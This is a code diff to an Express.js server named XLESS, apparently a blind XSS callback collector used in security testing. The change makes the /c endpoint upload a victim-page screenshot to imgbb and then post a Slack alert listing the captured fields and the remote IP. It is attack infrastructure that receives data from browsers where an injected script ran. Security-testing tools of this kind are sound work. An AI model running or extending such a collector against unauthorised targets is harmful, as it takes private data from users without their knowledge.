@@ -14,7 +14,6 @@ const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-
 app.use(function (req, res, next) {
   // Headers
   res.header("Powered-By", "XLESS");
@@ -28,6 +27,10 @@ app.use(function (req, res, next) {
 function generate_blind_xss_alert(body) {
   var alert = "*XSSless: Blind XSS Alert*\n";
   for( let k of Object.keys(body)) {
+    if (k === "Screenshot") {
+      continue
+    }
+
     if (body[k] === "") {
       alert += "*"+k+":* " + "```None```" + "\n"
     } else {
@@ -67,15 +70,39 @@ app.get("/examples", (req, res) => {
 
 
 app.post("/c", (req, res) => {
-    var data = req.body
-    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
-    const alert = generate_blind_xss_alert(data)
-    data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
+    let data = req.body
+    
+    const options = {
+        method: "POST",
+        url: "https://api.imgbb.com/1/upload?key=" + process.env.IMGBB_API_KEY,
+        port: 443,
+        headers: {
+            "Content-Type": "multipart/form-data"
+        },
+        formData : {
+            "image" : data["Screenshot"].replace("data:image/png;base64,","")
+        }
+    };
 
-    request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
-      res.send("ok\n")
-      res.end()
-    });
+    // Upload our screenshot and only then send the Slack alert
+    data["Screenshot_Url"] = ""
+    request(options, (err, imgRes, imgBody) => {
+      // Try uploading our screenshot
+      const imgOut = JSON.parse(imgBody)
+      if(imgOut && imgOut.data && imgOut.data.url_viewer) {
+        data["Screenshot_Url"] = imgOut.data.url_viewer
+      }
+
+      // Now handle the regular Slack alert
+      data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
+      const alert = generate_blind_xss_alert(data)
+      data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
+
+      request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
+        res.send("ok\n")
+        res.end()
+      });
+    })
 })
 
 
